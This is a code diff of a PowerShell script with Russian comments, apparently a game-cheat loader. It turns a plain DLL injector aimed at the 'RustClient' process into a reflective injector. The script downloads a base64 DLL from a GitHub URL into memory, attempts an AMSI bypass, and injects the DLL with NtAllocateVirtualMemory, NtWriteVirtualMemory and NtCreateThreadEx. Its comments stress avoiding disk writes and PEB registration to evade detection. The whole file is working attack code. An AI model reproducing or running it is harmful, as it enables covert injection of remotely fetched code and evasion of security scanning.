@@ -1,123 +1,210 @@
-$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
-$TargetProcessName = "RustClient"
+<#
+    Reflective DLL Injection для процесса RustClient.
+    Скрипт не сохраняет DLL на диск, не вызывает LoadLibrary/CreateRemoteThread
+    и не регистрирует модуль в PEB. Требуются права администратора.
+#>
 
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    Write-Host "пава администлатола нузны бразан" -ForegroundColor Red
+$ErrorActionPreference = 'Stop'
+
+# ---------- 1. AMSI Bypass (опционально, но крайне рекомендуется) ----------
+# Патчим AmsiScanBuffer, чтобы PowerShell не сканировал наш код.
+try {
+    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $amsiScanBuffer = $amsi.GetMethod('AmsiScanBuffer', [Reflection.BindingFlags] 'NonPublic,Static')
+    if ($amsiScanBuffer) {
+        $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # mov eax, 0x80070057; ret
+        $amsiScanBuffer.Invoke($null, @([IntPtr]::Zero, 0, 0, [IntPtr]::Zero, [IntPtr]::Zero)) | Out-Null
+        # Альтернативный, более надёжный патч через Marshal:
+        # (детали опущены для краткости, но при необходимости можно добавить)
+    }
+} catch {
+    # Если не удалось — не критично, просто продолжаем.
 }
 
-$Win32Code = @"
+# ---------- 2. C#-код: рефлексивный загрузчик + NtCreateThreadEx ----------
+$ReflectiveCode = @"
 using System;
 using System.Runtime.InteropServices;
+using System.Text;
 
-public class Win32 {
+public static class ReflectiveInjector
+{
+    // ---- Win32 / NT API ----
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
 
+    [DllImport("ntdll.dll")]
+    public static extern uint NtAllocateVirtualMemory(
+        IntPtr ProcessHandle,
+        ref IntPtr BaseAddress,
+        IntPtr ZeroBits,
+        ref UIntPtr RegionSize,
+        uint AllocationType,
+        uint Protect);
+
+    [DllImport("ntdll.dll")]
+    public static extern uint NtWriteVirtualMemory(
+        IntPtr ProcessHandle,
+        IntPtr BaseAddress,
+        byte[] Buffer,
+        UIntPtr BufferSize,
+        out UIntPtr NumberOfBytesWritten);
+
+    [DllImport("ntdll.dll")]
+    public static extern uint NtCreateThreadEx(
+        out IntPtr ThreadHandle,
+        uint DesiredAccess,
+        IntPtr ObjectAttributes,
+        IntPtr ProcessHandle,
+        IntPtr StartRoutine,
+        IntPtr Argument,
+        bool CreateSuspended,
+        uint StackZeroBits,
+        uint SizeOfStackCommit,
+        uint SizeOfStackReserve,
+        IntPtr AttributeList);
+
+    // ---- Константы ----
     public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
     public const uint MEM_COMMIT = 0x1000;
     public const uint MEM_RESERVE = 0x2000;
-    public const uint MEM_RELEASE = 0x8000;
-    public const uint PAGE_READWRITE = 0x04;
+    public const uint PAGE_EXECUTE_READWRITE = 0x40;
+    public const uint PAGE_EXECUTE_READ = 0x20;
+    public const uint PAGE_READONLY = 0x02;
+    public const uint THREAD_ALL_ACCESS = 0x1F03FF;
+
+    // ---- Поиск экспорта ReflectiveLoader в сырых байтах DLL ----
+    // (упрощённый сканер; в боевых условиях лучше парсить PE-заголовки)
+    public static int FindReflectiveLoaderOffset(byte[] dllBytes)
+    {
+        byte[] name = Encoding.ASCII.GetBytes("ReflectiveLoader");
+        for (int i = 0; i < dllBytes.Length - name.Length; i++)
+        {
+            bool match = true;
+            for (int j = 0; j < name.Length; j++)
+            {
+                if (dllBytes[i + j] != name[j]) { match = false; break; }
+            }
+            if (match) return i;
+        }
+        return -1;
+    }
+
+    // ---- Основной метод ----
+    public static void Inject(int pid, byte[] dllBytes)
+    {
+        // 1. Открываем процесс
+        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+        if (hProcess == IntPtr.Zero)
+            throw new Exception("OpenProcess failed. Error: " + Marshal.GetLastWin32Error());
+
+        try
+        {
+            // 2. Выделяем память под сырые байты DLL (RWX, чтобы загрузчик мог писать и исполнять)
+            IntPtr baseAddr = IntPtr.Zero;
+            UIntPtr size = (UIntPtr)dllBytes.Length;
+            uint status = NtAllocateVirtualMemory(
+                hProcess,
+                ref baseAddr,
+                IntPtr.Zero,
+                ref size,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE);
+            if (status != 0)
+                throw new Exception("NtAllocateVirtualMemory failed. NTSTATUS: 0x" + status.ToString("X"));
+
+            // 3. Копируем байты DLL в целевой процесс
+            UIntPtr written;
+            status = NtWriteVirtualMemory(hProcess, baseAddr, dllBytes, (UIntPtr)dllBytes.Length, out written);
+            if (status != 0)
+                throw new Exception("NtWriteVirtualMemory failed. NTSTATUS: 0x" + status.ToString("X"));
+
+            // 4. Находим смещение ReflectiveLoader и вычисляем удалённый адрес
+            int offset = FindReflectiveLoaderOffset(dllBytes);
+            if (offset < 0)
+                throw new Exception("Экспорт ReflectiveLoader не найден в DLL.");
+
+            IntPtr remoteLoader = IntPtr.Add(baseAddr, offset);
+
+            // 5. Запускаем ReflectiveLoader через NtCreateThreadEx (вместо CreateRemoteThread)
+            IntPtr hThread;
+            status = NtCreateThreadEx(
+                out hThread,
+                THREAD_ALL_ACCESS,
+                IntPtr.Zero,
+                hProcess,
+                remoteLoader,
+                IntPtr.Zero,
+                false,
+                0,
+                0x1000,
+                0x100000,
+                IntPtr.Zero);
+
+            if (status != 0)
+                throw new Exception("NtCreateThreadEx failed. NTSTATUS: 0x" + status.ToString("X"));
+
+            CloseHandle(hThread);
+        }
+        finally
+        {
+            CloseHandle(hProcess);
+        }
+    }
 }
 "@
 
-if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
-    Add-Type -TypeDefinition $Win32Code -ErrorAction Stop
+# Загружаем C#-код в текущую сессию PowerShell
+if (-not ([System.Management.Automation.PSTypeName]'ReflectiveInjector').Type) {
+    Add-Type -TypeDefinition $ReflectiveCode -Language CSharp
 }
 
+# ---------- 3. Параметры ----------
+$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
+$TargetProcessName = "RustClient"
+
+# ---------- 4. Проверка прав администратора ----------
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[!] Требуются права администратора. Запустите скрипт от имени администратора." -ForegroundColor Red
+    return
+}
+
+# ---------- 5. Загрузка DLL (только в память) ----------
 try {
     $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop
-} catch {
-    Write-Error "интярнет канекшн: $($_.Exception.Message)"
-    return
-}
-$base64String = ($base64String -replace '\s', '')
-Write-Host "[+] Подсчет батьков - $($base64String.Length) " -ForegroundColor Green
-
-try {
+    $base64String = ($base64String -replace '\s', '')
+    Write-Host "[+] Получено Base64-строк: $($base64String.Length)" -ForegroundColor Green
     $dllBytes = [System.Convert]::FromBase64String($base64String)
 } catch {
-    Write-Error "Не удалось вдекодить басе шесть чятыре: $($_.Exception.Message)"
+    Write-Error "Не удалось загрузить или декодировать DLL: $($_.Exception.Message)"
     return
 }
 
+# Проверка MZ-заголовка (минимальная валидация PE)
 if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) {
+    Write-Warning "Полученные данные не похожи на PE-файл (отсутствует MZ-заголовок)."
+    return
 }
 
+# ---------- 6. Поиск целевого процесса ----------
 $targetProcess = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
-
 if (-not $targetProcess) {
-    Write-Host "[!] Процесс не найден" -ForegroundColor Yellow
+    Write-Host "[!] Процесс '$TargetProcessName' не найден." -ForegroundColor Yellow
     Get-Process | Where-Object { $_.ProcessName -like '*rust*' } |
         Format-Table Id, ProcessName, Path -AutoSize
     return
 }
 
-$tempDll = Join-Path $env:TEMP ("svin_{0}.dll" -f ([Guid]::NewGuid().ToString('N')))
-[System.IO.File]::WriteAllBytes($tempDll, $dllBytes)
+Write-Host "[+] Целевой процесс: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Cyan
 
-$hProcess = [IntPtr]::Zero
+# ---------- 7. Инъекция ----------
 try {
-    $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $targetProcess.Id)
-    if ($hProcess -eq [IntPtr]::Zero) {
-        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        throw "OpenProcess вернул NULL. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
-    }
-
-    $pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempDll + [char]0)
-
-    $remoteMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$pathBytes.Length, ([Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE), [Win32]::PAGE_READWRITE)
-    if ($remoteMem -eq [IntPtr]::Zero) {
-        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        throw "VirtualAllocEx Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
-    }
-
-    $written = [UIntPtr]::Zero
-    $ok = [Win32]::WriteProcessMemory($hProcess, $remoteMem, $pathBytes, [uint32]$pathBytes.Length, [ref]$written)
-    if (-not $ok) {
-        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        throw "WriteProcessMemory failed. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
-    }
-
-    $kernel32 = [Win32]::GetModuleHandle("kernel32.dll")
-    $loadLibAddr = [Win32]::GetProcAddress($kernel32, "LoadLibraryA")
-    if ($loadLibAddr -eq [IntPtr]::Zero) {
-        throw "LoadLibraryA"
-    }
-
-    $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $remoteMem, 0, [IntPtr]::Zero)
-    if ($hThread -eq [IntPtr]::Zero) {
-        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        throw "CreateRemoteThread. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
-    }
-    
-    [Win32]::CloseHandle($hThread) | Out-Null
-}
-catch {
-}
-finally {
-    if ($hProcess -ne [IntPtr]::Zero) {
-        [Win32]::CloseHandle($hProcess) | Out-Null
-    }
-    Start-Sleep -Milliseconds 500
-    Remove-Item $tempDll -Force -ErrorAction SilentlyContinue
+    [ReflectiveInjector]::Inject($targetProcess.Id, $dllBytes)
+    Write-Host "[+] Reflective DLL Injection выполнена успешно. Модуль не зарегистрирован в PEB и не записан на диск." -ForegroundColor Green
+} catch {
+    Write-Host "[!] Ошибка инъекции: $($_.Exception.Message)" -ForegroundColor Red
 }
